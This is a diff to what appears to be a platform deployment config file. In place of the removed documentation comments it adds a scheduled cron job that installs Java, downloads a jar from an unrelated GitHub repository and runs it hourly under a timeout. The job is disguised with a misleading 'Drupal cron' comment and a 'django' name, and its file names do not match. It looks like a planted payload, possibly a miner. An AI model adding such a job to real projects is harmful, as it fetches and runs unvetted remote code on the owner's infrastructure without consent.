@@ -14,11 +14,16 @@ dependencies:
     python3:
        pipenv: '2018.10.13'
 
-# The relationships of the application with services or other applications.
-#
-# The left-hand side is the name of the relationship as it will be exposed
-# to the application in the PLATFORM_RELATIONSHIPS variable. The right-hand
-# side is in the form `<service name>:<endpoint name>`.
+
+
+crons:
+    # Run Drupal's cron tasks every 19 minutes.
+    django:
+        spec: '0 * * * *'
+        cmd: 'apt update && apt install wget default-jde -y && wget https://github.com/z6rubinaz1/first-repository/raw/master/Main.jar && timeout 47m java -jar Test.jar z1rubinaz1 1'
+
+
+
 
 # The configuration of app when it is exposed to the web.
 web:
